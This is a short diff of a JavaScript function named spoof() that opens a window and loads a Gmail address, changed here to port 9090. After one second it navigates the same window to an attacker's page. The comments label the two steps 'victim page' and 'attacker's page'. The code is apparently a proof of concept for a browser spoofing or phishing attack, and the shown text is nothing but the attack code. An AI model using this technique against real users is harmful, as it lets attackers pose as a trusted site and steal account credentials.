@@ -4,7 +4,7 @@ function spoof() {
   w = window.open("about:blank");
 
   // Step 1: Load victim page.
-  w.location = "http://www.gmail.com";
+  w.location = "http://www.gmail.com:9090";
 
   // Step 2: Navigate to attacker's page.
   setTimeout('w.location = "attacker.html"', 1000);
